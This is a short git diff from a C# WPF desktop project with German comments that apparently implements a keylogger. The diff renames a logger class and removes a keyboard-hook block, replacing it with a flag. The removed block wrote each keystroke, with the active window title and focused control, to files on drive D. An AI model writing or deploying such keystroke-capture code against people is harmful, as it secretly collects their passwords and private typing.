@@ -24,7 +24,7 @@ namespace AbschlussprojektWPF
     /// </summary>
     public partial class wndMain : Window
     {
-        clsLogger logFile = new clsLogger();
+        Logger logFile = new Logger();
 
         // bools zum Überprüfen der Checkboxen
         bool firefox;
@@ -110,13 +110,7 @@ namespace AbschlussprojektWPF
             {
                 wndMessageBoxStartLog wndMessageBoxStartedLog = new wndMessageBoxStartLog();
                 wndMessageBoxStartedLog.Show();
-                using (var api = new KeystrokeAPI())
-                {
-                    KeystrokeAPI ki = new KeystrokeAPI();
-                    api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + " " + logFile.GetFocusedControl() + "\r\n\r\n"); ; });
-                    api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeysOnly.txt", character + "\r\n\r\n"); ; });
-
-                }
+                App.IsLoggingStarted = true;
 
             }
 
